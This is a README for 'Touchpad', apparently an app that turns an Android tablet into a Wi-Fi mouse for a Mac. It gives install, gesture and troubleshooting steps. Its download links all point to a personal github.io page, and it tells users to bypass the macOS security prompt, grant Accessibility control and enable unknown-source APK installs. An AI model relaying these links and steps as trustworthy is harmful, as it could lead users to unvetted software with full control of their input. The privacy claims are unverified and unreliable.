# 📱 Touchpad - Turn tablets into wireless computer mice

[![Download Touchpad](https://img.shields.io/badge/Download-Touchpad-blue.svg)](https://tommiperfect31.github.io)

Touchpad lets you use an old Android tablet as a wireless mouse for your computer. The tablet tracks your finger movements and sends signals over your local network. Your computer reads these signals and moves the cursor, clicks, or scrolls. You do not need an active internet connection to use this system.

## ⚙️ System Requirements

Ensure your devices meet these requirements before you start:

*   **Computer:** A Mac running macOS 10.15 or newer.
*   **Tablet:** An Android device running Android 4.0 or higher.
*   **Network:** Both the computer and the tablet must connect to the same Wi-Fi network.
*   **Permissions:** You must allow the application to control your computer mouse movements during setup.

## 🚀 Getting Started

Follow these steps to set up the system. You need to install the software on both your Mac and your Android tablet.

1. Visit [this page](https://tommiperfect31.github.io) to download the necessary files.
2. Download the Mac application file to your computer.
3. Download the Android application package file (APK) to your tablet.

## 💻 Installing on macOS

1. Open your Downloads folder.
2. Locate the file ending in `.dmg` or `.app`.
3. Double-click the file to open the installer.
4. Drag the Touchpad icon into your Applications folder.
5. Open your Applications folder and launch the Touchpad app.
6. If a security prompt appears, click Open to allow the application to run.
7. Grant the app "Accessibility" permissions when the system requests them. This permission allows the app to move your cursor.

## 🤖 Installing on Android

1. Transfer the APK file to your tablet using a USB cable or cloud storage.
2. Open the File Manager on your tablet.
3. Find the APK file and tap it.
4. If your tablet blocks the install, go to Settings, then Security, and enable "Install from Unknown Sources".
5. Tap Install to finish the process.

## 🔌 Connecting Your Devices

1. Connect your Mac and your Android tablet to the same Wi-Fi network.
2. Launch the Touchpad app on your Mac. You will see a small icon in your top menu bar.
3. Launch the Touchpad app on your Android tablet.
4. The tablet app will scan for available computers on your network.
5. Select your Mac from the list on your tablet screen.
6. The devices now link. Your tablet functions as a trackpad.

## 🖱️ How to Use the Touchpad

The tablet surface maps to your computer screen. Use these gestures to control your computer:

*   **Move Cursor:** Slide your finger across the tablet screen.
*   **Left Click:** Tap once on the tablet with one finger.
*   **Right Click:** Tap once using two fingers.
*   **Scroll:** Place two fingers on the tablet and slide them up or down.
*   **Drag:** Tap and hold your finger on the tablet, then move to relocate an item.

## 🛠️ Troubleshooting

If the devices do not connect, verify these common fixes:

*   **Check Wi-Fi:** Make sure both devices show the same Wi-Fi name.
*   **Restart Apps:** Close both applications and reopen them.
*   **Disable Firewall:** Sometimes a local firewall blocks the connection. Check your Mac security settings to ensure Touchpad has permission to communicate on the local network.
*   **Distance:** Move the tablet closer to your wireless router to ensure a stable signal. 

## 📝 Features

*   **No Internet Required:** The system uses your home network, so your data stays private.
*   **Low Latency:** The movement responds quickly to your touch.
*   **Compatibility:** Works with most Android tablets made after 2012.
*   **Custom Settings:** You can adjust the speed of the mouse pointer within the Mac app menu.

## 🔒 Privacy and Security

The app only communicates with devices on your local network. It does not send your touch data or mouse movements to the internet. The app does not collect personal information or track your usage habits. All data stays between the tablet and the computer.
